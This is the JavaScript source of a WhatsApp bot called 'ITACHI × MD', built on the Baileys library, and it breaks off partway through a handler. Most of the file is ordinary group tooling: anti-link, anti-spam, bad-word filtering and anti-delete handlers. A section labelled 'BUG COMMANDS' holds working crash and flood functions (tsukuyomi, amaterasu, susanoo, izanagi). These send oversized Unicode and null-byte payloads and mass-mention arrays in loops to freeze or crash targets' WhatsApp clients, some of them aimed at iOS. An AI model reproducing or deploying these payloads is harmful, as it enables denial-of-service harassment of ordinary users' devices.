
global.db = global.db || {};
global.db.data = global.db.data || {};
global.db.data.chats = global.db.data.chats || {};
global.db.data.users = global.db.data.users || {};
global.db.data.settings = global.db.data.settings || {};
global.MENU_IMAGE = "https://i.postimg.cc/28VfLfNg/2c953630efdb64d589df671214e4603d.jpg";
global.CHANNEL_JID = "120363423865060284@newsletter";

// Proxy to auto-create chat entries
global.db.data.chats = new Proxy(global.db.data.chats, {
  get(target, prop) {
    if (!target[prop]) {
      target[prop] = {
        antilink: false,
        antidelete: false,
        antiedit: false,
        antiviewonce: false,
        antispam: false,
        antiflood: false,
        anticall: false,
        antipoll: false,
        antisticker: false,
        antivirtex: false,
        antiforeign: false,
        antitoxic: false,
        antibot: false,
        antinsfw: false,
        autoread: false,
        welcome: true,
        goodbye: false,
        mute: false,
        filterWords: []
      };
    }
    return target[prop];
  }
});

// Proxy to auto-create user entries
global.db.data.users = new Proxy(global.db.data.users, {
  get(target, prop) {
    if (!target[prop]) {
      target[prop] = {
        name: 'User',
        warnings: 0,
        spamWarns: 0,
        toxicWarns: 0,
        nsfwWarns: 0,
        banned: false,
        level: 1,
        xp: 0,
        lastSeen: Date.now()
      };
    }
    return target[prop];
  }
});
require('./setting/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const googleTTS = require('google-tts-api')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./allfunc/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./allfunc/exif.js')
const richpic = fs.readFileSync(`./media/image1.jpg`)
const numberEmojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"];

// Game storage
const tictactoeGames = {};
const hangmanGames = {};
const hangmanVisual = [
    "😃🪓______", // 6 attempts left
    "😃🪓__|____",
    "😃🪓__|/___",
    "😃🪓__|/__",
    "😃🪓__|/\\_",
    "😃🪓__|/\\_", 
    "💀 Game Over!" // 0 attempts left
];

const ownername = "ᴅᴇᴠ ᴋɪɴɢsʟᴇʏ"
const { getSetting, setSetting } = require("./Settings.js")
const groupCache = new Map();

module.exports = rich = async (rich, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :

    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :

    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :

    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :

    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[ᴘᴇsᴀɴ sᴇᴋᴀʟɪ ʟɪʜᴀᴛ]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[ᴘᴇsᴀɴ sᴇᴋᴀʟɪ ʟɪʜᴀᴛ]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[ᴘᴇsᴀɴ sᴇᴋᴀʟɪ ʟɪʜᴀᴛ]") :

    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[ᴘᴇsᴀɴ sᴇᴍᴇɴᴛᴀʀᴀ]") :

    m.mtype === "interactiveMessage" ? "[ᴘᴇsᴀɴ ɪɴᴛᴇʀᴀᴋᴛɪғ]" :
    m.mtype === "protocolMessage" ? "[ᴘᴇsᴀɴ ᴛᴇʟᴀʜ ᴅɪʜᴀᴘᴜs]" :
    ""
);

const prefix = '.';
const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./allfunc/premium.json'))
const isCmd = body.startsWith(prefix);
const args = body.slice(prefix.length).trim().split(/ +/);
const command = args.shift().toLowerCase();
const text = args.join(" ")
const botNumber = await rich.decodeJid(rich.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await rich.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

const reply = async (text) => rich.sendMessage(m.chat, {
    text,
    contextInfo: {
        mentionedJid: [sender],
        externalAdReply: {
            title: "𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃",
            body: pushname,
            mediaUrl: "https://t.me/lumoratech",
            sourceUrl: "https://t.me/dev_kingsley",
            thumbnailUrl: "https://i.postimg.cc/h4xyXsKC/38e7ffd336110b098fded3523f74ac6a.jpg",
            showAdAttribution: false
        }
    }
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendTypingMenu(rich, m, menuPayload) {
    await rich.sendPresenceUpdate('composing', m.chat);
    await sleep(1200); // typing delay (adjust if you want faster/slower)

    await rich.sendPresenceUpdate('paused', m.chat);
    await rich.sendMessage(m.chat, menuPayload, { quoted: m });
}

async function sendImage(imageUrl, caption) {
  rich.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption,
    contextInfo: {
      forwardingScore: 9,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363419101584613@newsletter",
        newsletterName: "🔴 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃 ʙʏ ʟᴜᴍᴏʀᴀ ᴛᴇᴄʜ",
      }
    }
  }, { quoted: m });
}

async function cookingAndReact(sock, m, emoji = '🍳') {
  // Send "Cooking..." message
  await sock.sendMessage(m.chat, {
    text: `Processing Command.\n> ITACHI MD`
  }, { quoted: m });

  // React to the user's message
  await sock.sendMessage(m.chat, {
    react: {
      text: emoji,
      key: m.key
    }
  });
}


const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const Richie = "ʟᴜᴍᴏʀᴀ ᴛᴇᴄʜ";

if (!rich.public) {
    if (!isCreator) return
}

const example = (teks) => {
    return `ᴜsᴀɢᴇ : *${prefix+command}* ${teks}`
}

let antilinkStatus = {};
if (!global.banned) global.banned = {}

if (getSetting(m.sender, "autobio", true)) {
    rich.updateProfileStatus(`🔴 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃 ɪs ᴏɴʟɪɴᴇ 🔴`).catch(_ => _)
}

if (isCmd) {
    console.log(chalk.red(chalk.bgWhite('[🔴 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃]')), chalk.black(chalk.bgCyan(new Date)), chalk.black(chalk.bgMagenta(body || m.mtype)) + '\n' + chalk.cyan('⚡ ғʀᴏᴍ'), chalk.yellow(pushname), chalk.green(m.sender) + '\n' + chalk.blue('📍 ɪɴ'), chalk.magenta(m.isGroup ? groupName : 'ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ', m.chat))
}

if (getSetting(m.chat, "autoReact", false)) {
    const emojis = [
        "🔴", "⚫", "⚡", "🔥", "🌙", "🎭", "⚔️", "🍃", "💀", "🎌",
        "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "😠", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🙏", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    try {
        await rich.sendMessage(m.chat, {
            react: { text: randomEmoji, key: m.key },
        });
    } catch (err) {
        console.error('⚠️ ʀᴇᴀᴄᴛɪᴏɴ ᴇʀʀᴏʀ:', err.message);
    }
}

if (getSetting(m.chat, "autoTyping", false)) {
    rich.sendPresenceUpdate('composing', from)
}

if (getSetting(m.chat, "autoRecording", false)) {
    rich.sendPresenceUpdate('recording', from)
}

if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    rich.sendPresenceUpdate(xeonrecordinfinal, from)
}

if (getSetting(m.chat, "antilink", false) && m.isGroup) {
    let linkRegex = /(https?:\/\/[^\s]+)/gi;
    if (linkRegex.test(m.text)) {
        if (isAdmins || isCreator) return;
        await rich.sendMessage(m.chat, { 
            text: `┏━━━━━━━━━━━━━━━━━━┓
┃  🚫 ʟɪɴᴋ ᴅᴇᴛᴇᴄᴛᴇᴅ!
┗━━━━━━━━━━━━━━━━━━┛

⚠️ @${m.sender.split("@")[0]} ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ ᴛᴏ sʜᴀʀᴇ ʟɪɴᴋs!`, 
            mentions: [m.sender] 
        }, { quoted: m });
        try {
            await rich.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } });
        } catch (e) {
            console.log("❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴅᴇʟᴇᴛᴇ:", e);
        }
    }
}

if (getSetting(m.sender, "autoViewStatus", false) && m.key.remoteJid === "status@broadcast") {
    try {
        await rich.readMessages([m.key]);
        console.log(chalk.cyan(`👀 ᴠɪᴇᴡᴇᴅ sᴛᴀᴛᴜs ғʀᴏᴍ: ${m.key.participant}`));
    } catch (err) {
        console.log(chalk.red("❌ sᴛᴀᴛᴜs ᴠɪᴇᴡ ᴇʀʀᴏʀ:"), err);
    }
}

if (getSetting(m.sender, "autoread", false)) {
   try {
      await rich.readMessages([m.key]) 
   } catch (e) {
      console.log(chalk.red("❌ ᴀᴜᴛᴏ-ʀᴇᴀᴅ ᴇʀʀᴏʀ:"), e)
   }
}

if (getSetting(m.sender, "banned", false)) {
    await rich.sendMessage(m.chat, { 
        text: `┏━━━━━━━━━━━━━━━━━━┓
┃  🔴 ʙᴀɴɴᴇᴅ ᴜsᴇʀ
┗━━━━━━━━━━━━━━━━━━┛

🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ᴜsɪɴɢ ᴛʜɪs ʙᴏᴛ, @${m.sender.split('@')[0]}

_"Those who break the rules are scum."_ - Kakashi 🍃`, 
        mentions: [m.sender] 
    }, { quoted: m })
    return
}

if (getSetting(m.chat, "feature.autoreply", false)) {
   const autoReplyList = { 
       "hi": "┏━━━━━━━━━━━━━━━━━━┓\n┃  👋 ᴋᴏɴɴɪᴄʜɪᴡᴀ!    \n┗━━━━━━━━━━━━━━━━━━┛", 
       "hello": "┏━━━━━━━━━━━━━━━━━━┓\n┃  ⚡ ʏᴏ! ᴡʜᴀᴛ's ᴜᴘ?  \n┗━━━━━━━━━━━━━━━━━━┛", 
       "bot": "┏━━━━━━━━━━━━━━━━━━┓\n┃  🤖 sʜᴀʀɪɴɢᴀɴ ᴀᴄᴛɪᴠᴇ \n┗━━━━━━━━━━━━━━━━━━┛",
       "itachi": "┏━━━━━━━━━━━━━━━━━━┓\n┃  🔴 ɪᴛᴀᴄʜɪ ɪs ʜᴇʀᴇ  \n┗━━━━━━━━━━━━━━━━━━┛\n\n_\"Reality is cruel.\"_ - Itachi 🍃"
   }
   if (autoReplyList[m.text?.toLowerCase()]) {
      await rich.sendMessage(m.chat, { text: autoReplyList[m.text.toLowerCase()] }, { quoted: m })
   }
}

if (getSetting(m.chat, "feature.antispam", false) && m.isGroup) {
    if (!global.spam) global.spam = {};
    if (!global.spam[m.sender]) global.spam[m.sender] = { count: 0, last: Date.now() };

    let spamData = global.spam[m.sender];
    let now = Date.now();

    if (now - spamData.last < 5000) {
        spamData.count++;
        if (spamData.count >= 5) {
            try {
                await rich.groupParticipantsUpdate(m.chat, [m.sender], "remove");
                await rich.sendMessage(m.chat, { 
                    text: `┏━━━━━━━━━━━━━━━━━━┓
┃  ⚠️ sᴘᴀᴍ ᴅᴇᴛᴇᴄᴛᴇᴅ!
┗━━━━━━━━━━━━━━━━━━┛

🚫 @${m.sender.split('@')[0]} ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғᴏʀ sᴘᴀᴍᴍɪɴɢ!

_"Those who break the rules are trash."_ - Obito 🍃`, 
                    mentions: [m.sender] 
                });
                console.log(chalk.red(`🚫 ᴋɪᴄᴋᴇᴅ sᴘᴀᴍᴍᴇʀ: ${m.sender}`));
            } catch (err) {
                console.log(chalk.red("❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴋɪᴄᴋ sᴘᴀᴍᴍᴇʀ:"), err);
            }
            spamData.count = 0;
        }
    } else {
        spamData.count = 1;
    }
    spamData.last = now;
}

if (getSetting(m.chat, "feature.antibadword", false)) {
   const badWords = ["fuck", "bitch", "sex", "nigga", "bastard", "fool", "mumu", "idiot", "asshole", "shit", "damn"]
   if (badWords.some(word => m.text?.toLowerCase().includes(word))) {
      await rich.sendMessage(m.chat, { 
          text: `┏━━━━━━━━━━━━━━━━━━┓
┃  🚫 ʙᴀᴅ ᴡᴏʀᴅ ᴅᴇᴛᴇᴄᴛᴇᴅ
┗━━━━━━━━━━━━━━━━━━┛

⚠️ @${m.sender.split('@')[0]} ᴡᴀᴛᴄʜ ʏᴏᴜʀ ʟᴀɴɢᴜᴀɢᴇ!

_"A ninja must see underneath the underneath."_ - Kakashi 🍃`, 
          mentions: [m.sender] 
      })
      await rich.sendMessage(m.chat, { delete: m.key })
   }
}

if (getSetting(m.chat, "feature.antibot", false)) {
   let botPrefixes = ['.', '!', '/', '#', '$', '%']
   if (botPrefixes.includes(m.text?.trim()[0])) {
      if (!isCreator && !isAdmins) {
         await rich.sendMessage(m.chat, { 
             text: `┏━━━━━━━━━━━━━━━━━━┓
┃  🤖 ᴀɴᴛɪ-ʙᴏᴛ ᴀᴄᴛɪᴠᴇ
┗━━━━━━━━━━━━━━━━━━┛

🚫 @${m.sender.split('@')[0]} ᴏᴛʜᴇʀ ʙᴏᴛs ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ!

_"Only one Sharingan is needed here."_ 🔴`, 
             mentions: [m.sender] 
         })
         await rich.sendMessage(m.chat, { delete: m.key })
      }
   }
}

// ==================== ITACHI THEMED BUG COMMANDS ====================
// ⚠️ USE RESPONSIBLY - THESE ARE POWERFUL TECHNIQUES ⚠️

// Tsukuyomi - Infinite Loop Delay Attack
async function tsukuyomi(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Uchiha Clan\",\"landmark_area\":\"Hidden Leaf\",\"address\":\"Sharingan\",\"tower_number\":\"Mangekyō\",\"city\":\"Konoha\",\"name\":\"Itachi\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"Genjutsu | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await rich.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}

// Amaterasu - iOS Freeze Attack
async function amaterasu(target) {
  let msg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      contextInfo: {
        statusAttributionType: "RESHARED_FROM_POST"
      }, 
      text: "🔴 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮 - 𝐁𝐥𝐚𝐜𝐤 𝐅𝐥𝐚𝐦𝐞𝐬 🔥" + "𑇂𑆵𑆴𑆿".repeat(60000), 
      matchedText: "t.me/lumoratech", 
      groupInviteLinkType: "DEFAULT"
    }
  }, {});
  
  await rich.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid:target },
  });
}

// Izanami - Payment Request Loop
async function izanami(target, ptcp = true) {
  await rich.relayMessage(target, { requestPaymentMessage: {} }, ptcp ? { participant: { jid: target } } : {});
}

// Susanoo - iOS Crash Shield Breaker
async function susanoo(target) {
  for(let z = 0; z < 720; z++) {
    await rich.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🔴 𝐒𝐮𝐬𝐚𝐧𝐨𝐨 - 𝐏𝐞𝐫𝐟𝐞𝐜𝐭 𝐖𝐚𝐫𝐫𝐢𝐨𝐫 ⚔️` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/lumoratech",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: fs.readFileSync(`./media/image1.jpg`), 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ITACHI_UCHIHA_2026"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

// Izanagi - Reality Freeze
async function izanagi(target, group = false) {
    const message = generateWAMessageFromContent(target, {
        groupInviteMessage: {
            groupJid: `${Math.floor(Math.random() * 7202508)}@g.us`,
            groupName: "🔴 𝐈𝐳𝐚𝐧𝐚𝐠𝐢 - 𝐑𝐞𝐚𝐥𝐢𝐭𝐲 𝐑𝐞𝐰𝐫𝐢𝐭𝐞 👁️" + "𑇂𑆵𑆴𑆿".repeat(15000),
            caption: "🔴 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃 - 𝐔𝐜𝐡𝐢𝐡𝐚 𝐂𝐥𝐚𝐧 ⚔️" + "𑇂𑆵𑆴𑆿".repeat(15000),
            inviteCode: crypto.randomBytes(72).toString('hex').toUpperCase(),
            inviteExpiration: "720594829",
            contextInfo: {
                quotedMessage: {
                    conversation: "𑇂𑆵𑆴𑆿".repeat(15000)
                }
            },
            jpegThumbnail: fs.readFileSync("./media/image1.jpg"),
        }
    }, {});
    
    await rich.relayMessage(target,
        message.message,
        group ?
        {
            messageId: message.key.id
        } : {
            participant: {
                jid: target
            },
            messageId: message.key.id
        }
    )
}

if (m.message) {
    console.log(chalk.red(`🔴 ᴍᴇssᴀɢᴇ "${chalk.cyan(m.text || m.mtype)}" ғʀᴏᴍ ${chalk.yellow(pushname)} ${chalk.magenta(m.isGroup ? `ɪɴ ɢʀᴏᴜᴘ ${groupMetadata.subject}` : 'ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ')}`));
}
    
// ==================== INTERACTIVE BUTTON MENU SYSTEM ====================
// ═══════════════════════════════════════════════════════════
// 📌 MENU SYSTEM - ULTIMATE ITACHI DESIGN
// ═══════════════════════════════════════════════════════════

// Custom Newsletter/Channel JID for replies
const CHANNEL_JID = '120363424877911720@newsletter';

// Custom image URL
const MENU_IMAGE = 'https://files.catbox.moe/vmlpqv.jpg';

// Helper function to create channel message context
const createChannelContext = (title, body) => {
  return {
    key: {
      remoteJid: CHANNEL_JID,
      fromMe: false,
      id: `ITACHI${Date.now()}`,
      participant: CHANNEL_JID
    },
    message: {
      newsletterAdminInviteMessage: {
        newsletterJid: CHANNEL_JID,
        newsletterName: "🔴 𝐈𝐓𝐀𝐂𝐇𝐈 × 𝐌𝐃",
        jpegThumbnail: "",
        caption: title,
        inviteExpiration: Date.now() + 86400000
      }
    }
  };
};

if (m.isGroup && global.db.data.chats[m.chat].filterWords && global.db.data.chats[m.chat].filterWords.length > 0) {
  const messageText = m.text.toLowerCase();
  const filteredWord = global.db.data.chats[m.chat].filterWords.find(word => messageText.includes(word));
  
  if (filteredWord && !isAdmins && !isCreator) {
    await rich.sendMessage(m.chat, { 
      delete: m.key 
    });
    
    await rich.sendMessage(m.chat, {
      text: `⚠️ @${m.sender.split('@')[0]} your message was deleted!\n\n🚫 Reason: Contains filtered word "*${filteredWord}*"`,
      mentions: [m.sender]
    });
    
    return; // Stop processing this message
  }
}

// 2. ANTIBOT CHECK
if (m.isGroup && global.db.data.chats[m.chat].antibot && isBotAdmins) {
  // Check for new participants
  if (m.messageStubType === 27 || m.messageStubType === 31) { // 27 = added, 31 = joined via link
    const participants = m.messageStubParameters;
    
    for (let participant of participants) {
      try {
        // Check if participant is a bot (has .net in JID or is verified as business)
        const isBot = participant.includes('.net') || participant === botNumber;
        
        if (isBot && participant !== botNumber) {
          await rich.sendMessage(m.chat, {
            text: `🤖 *Antibot Activated!*\n\n❌ Bot detected and removed: @${participant.split('@')[0]}`,
            mentions: [participant]
          });
          
          await rich.groupParticipantsUpdate(m.chat, [participant], 'remove');
        }
      } catch (err) {
        console.log('Antibot error:', err);
      }
    }
  }
}

// 3. ANTI-NSFW CHECK (for images)
if (m.isGroup && global.db.data.chats[m.chat].antinsfw && isBotAdmins) {
  const isImage = m.mtype === 'imageMessage' || (m.mtype === 'viewOnceMessage' && m.msg.message?.imageMessage);
  
  if (isImage && !isAdmins && !isCreator) {
    try {
      // Download the image
      const media = await downloadMediaMessage(m, 'buffer', {});
      
      // NSFW Detection using TensorFlow.js (you'll need to implement this)
      // For now, we'll use a simple keyword-based check or external API
      
      // Option 1: Use external NSFW detection API (recommended)
      const formData = new FormData();
      formData.append('image', media, { filename: 'image.jpg' });
      
      // Example using NudeNet API or similar
      // You can use: https://github.com/notAI-tech/NudeNet
      // Or: https://deepai.org/machine-learning-model/nsfw-detector
      
      const nsfwCheck = await fetch('YOUR_NSFW_API_ENDPOINT', {
        method: 'POST',
        body: formData
      }).then(r => r.json());
      
      // If NSFW detected
      if (nsfwCheck.isNSFW || nsfwCheck.score > 0.7) {
        await rich.sendMessage(m.chat, { 
          delete: m.key 
        });
        
        await rich.sendMessage(m.chat, {
          text: `🔞 @${m.sender.split('@')[0]} your image was deleted!\n\n⚠️ Reason: NSFW content detected\n\n_Keep this group safe and appropriate._`,
          mentions: [m.sender]
        });
        
        // Optional: Warn the user
        if (!global.db.data.users[m.sender].nsfwWarns) {
          global.db.data.users[m.sender].nsfwWarns = 0;
        }
        global.db.data.users[m.sender].nsfwWarns++;
        
        // Kick after 3 warnings
        if (global.db.data.users[m.sender].nsfwWarns >= 3) {
          await rich.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
          await rich.sendMessage(m.chat, {
            text: `❌ @${m.sender.split('@')[0]} has been removed after 3 NSFW warnings!`,
            mentions: [m.sender]
          });
        }
      }
      
    } catch (err) {
      console.log('Anti-NSFW error:', err);
    }
  }
}

// ══════════════════════════════════════════════════════════
// 🛡️ AUTOMATIC PROTECTION HANDLERS
// ══════════════════════════════════════════════════════════

// Initialize message cache for spam/flood detection
if (!global.messageCache) global.messageCache = {};
if (!global.floodCache) global.floodCache = {};

// 1. ANTI-DELETE HANDLER
if (m.isGroup && global.db.data.chats[m.chat]?.antidelete) {
  // Store message in cache
  if (!global.deletedMessages) global.deletedMessages = {};
  global.deletedMessages[m.key.id] = {
    message: m,
    sender: m.sender,
    text: m.text,
    time: Date.now()
  };
}

// Listen for message deletion
rich.ev.on('messages.delete', async (deletedMsg) => {
  try {
    const chatId = deletedMsg.keys[0].remoteJid;
    const msgId = deletedMsg.keys[0].id;
    
    if (global.db.data.chats[chatId]?.antidelete && global.deletedMessages[msgId]) {
      const cached = global.deletedMessages[msgId];
      
      await rich.sendMessage(chatId, {
        text: `🔒 *Anti-Delete Activated!*\n\n👤 User: @${cached.sender.split('@')[0]}\n📝 Deleted Message:\n\n${cached.text || '[Media/Sticker]'}`,
        mentions: [cached.sender]
      });
      
      // Resend media if exists
      if (cached.message.message) {
        await rich.copyNForward(chatId, cached.message, false);
      }
    }
  } catch (err) {
    console.log('Anti-delete error:', err);
  }
});

// 2. ANTI-EDIT HANDLER
rich.ev.on('messages.update', async (updates) => {
  try {
    for (let update of updates) {
      const chatId = update.key.remoteJid;
      
      if (global.db.data.chats[chatId]?.antiedit && update.update.editedMessage) {
        const originalMsg = global.deletedMessages[update.key.id];
        const newText = update.update.editedMessage.message?.conversation || 
                       update.update.editedMessage.message?.extendedTextMessage?.text;
        
        if (originalMsg && newText) {
          await rich.sendMessage(chatId, {
            text: `✏️ *Message Edited!*\n\n👤 User: @${update.key.participant?.split('@')[0]}\n\n📝 *Original:*\n${originalMsg.text}\n\n✨ *Edited to:*\n${newText}`,
            mentions: [update.key.participant]
          });
        }
      }
    }
  } catch (err) {
